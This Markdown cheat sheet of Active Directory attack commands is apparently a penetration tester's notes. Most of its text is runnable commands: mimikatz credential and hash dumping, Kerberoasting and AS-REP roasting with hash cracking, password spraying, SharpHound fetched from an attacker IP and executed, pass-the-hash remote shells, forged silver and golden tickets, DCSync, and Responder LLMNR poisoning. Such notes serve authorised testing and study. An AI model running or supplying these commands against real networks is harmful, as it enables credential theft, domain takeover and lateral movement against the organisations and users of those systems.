# ## Cached Credential Storage and Retrieval
-> Dump the credentials of all connected users, including cached hashes
```
./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```
-> Mix  
```
./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
```


## Service Account Attacks
-> Sow user tickets that are stored in memory
```
./mimikatz.exe "sekurlsa::tickets"
```

-> Display all cached Kerberos tickets for the current user

```
klist
```

-> Export service tickets from memory
```
./mimikatz.exe "kerberos::list /export"
```

-> Wordlist Attack with tgsrepcrack.py to get the clear text password for the service account
```
sudo apt update && sudo apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <ticket.kirbi>
```

or  

https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1

## Password Spraying
```
.\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
```
https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1

## Enumeration - BloodHound
-> Install - Attacker VM
```
sudo apt install bloodhound
```

-> neo4j start - http://localhost:7474/
```
sudo neo4j start
```

-> Enumeration - Windows
```
iwr -uri <ip>/SharpHound.ps1 -Outfile SharpHound.ps1
. .\SharpHound.ps1
Invoke-Bloodhound -CollectionMethod All,loggedon
Invoke-BloodHound -CollectionMethod All -Verbose
Invoke-BloodHound -CollectionMethod LoggedOn -Verbose
```

## Access Validation 

-> Validation of network user credentials via smb using crackmmapexec  
```
crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> -d <domain> --continue-on-success
crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> -d <domain> 
crackmapexec smb 192.168.0.10-20 -u administrator -H <hash> --local-auth --lsa  
crackmapexec smb 192.168.0.10-20 -u administrator -p <password>
```

-> Connect via smbclient
```
smbclient //ip -U <user> -L
```

-> smbmap
```
smbmap -H <ip> -u <user> 
```

-> See read permission of given user on smb shares
```
crackmapexec smb <IP> --shares -u <user> -p '<pass>'
```

## AS-REP Roasting Attack - not require Pre-Authentication
-> kerbrute - Enumeration Users
```
kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
```
https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt

-> GetNPUsers.py - Query ASReproastable accounts from the KDC
```
impacket-GetNPUsers domain.local/ -dc-ip <IP> -usersfile userlist.txt
```

## Kerberoast
-> impacket-GetUserSPNs
```
impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
```
or  
```
impacket-GetUserSPNs -request -dc-ip <IP> -hashes <hash_machine_account>:<hash_machine_account> <domain>/<machine_name$> -outputfile hashes.kerberoast
```

```
hashcat -a 0 -m 13100 ok.txt /usr/share/wordlists/rockyou.txt 
```
```
.\PsExec.exe -u <domain>\<user> -p <password> cmd.exe
```
or  
```
runas /user:<hostname>\<user> cmd.exe
```


## Active Directory Lateral Movement
### Pass the Hash
-> Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
```
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd
```

-> Remote Access - impacket-psexec  
```
impacket-psexec '<domain>/<user>'@<IP> -hashes ':<hash>'
impacket-psexec '<domain>/<user>'@<IP>
```

-> Remote Access + evil-winrm  
```
evil-winrm -i <IP> -u <user> -H <hash>
```

### Over Pass the Hash
-> Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket, which grants us access to another machine or service as that user

```
mimikatz.exe "sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe" "exit"
```

-> Command execution with psexec  
```
.\PsExec.exe \\<hostname> cmd.exe
```

### Silver Ticket - Pass the Ticket
-> It is a persistence and elevation of privilege technique in which a TGS is forged to gain access to a service in an application.

-> Get SID
```
GetDomainsid (PowerView)
```
or  
```
whoami /user
```
-> Get Machine Account Hash
```
Invoke-Mimikatz '"lsadump::lsa /patch"' -ComputerName <hostname_dc>
```
-> Exploitation mimikatz.exe
```
kerberos::purge
kerberos::list
kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /target:<hostname.domain> /service:HTTP /rc4:<ervice_account_password_hash> /ptt
```
or
```
Invoke-Mimikatz -Command '"kerberos::golden /domain:<domain> /sid:<domainsid> /target:<dc>.<domain> /service:HOST /rc4:<machine_account_hash> /user:Administrator /ptt"'
kerberos::list
```

### Golden Ticket - Pass the Ticket
-> It is a persistence and elevation of privilege technique where tickets are forged to take control of the Active Directory Key Distribution Service (KRBTGT) account and issue TGT's.

-> Get hash krbtgt
```
./mimikatz.exe "privilege::debug" "lsadump::lsa /patch"
```
-> Get SID
```
GetDomainsid (PowerView)
```
or  
```
whoami /user
```

-> Exploitation
```
mimikatz.exe "kerberos::purge" "kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt" "misc::cmd"

psexec.exe \\dc1 cmd.exe
```

### DCSync Attack
-> The DCSync attack consists of requesting a replication update with a domain controller and obtaining the password hashes of each account in Active Directory without ever logging into the domain controller.
```
./mimikatz.exe "lsadump::dcsync /user:Administrator"
```

### NetNTLM Authentication Exploits with SMB - LLMNR Poisoning - Capturing hash in responder
Responder allows you to perform Man-in-the-Middle attacks by poisoning responses during NetNTLM authentication, making the client talk to you instead of the real server it wants to connect to.
On a real lan network, the responder will attempt to poison all Link-Local Multicast Name Resolution (LLMNR), NetBIOS Name Server (NBT-NS), and Web Proxy Auto-Dscovery (WPAD) requests detected. NBT-NS is the precursor protocol to LLMNR.
```
responder -I eth0 -v
```
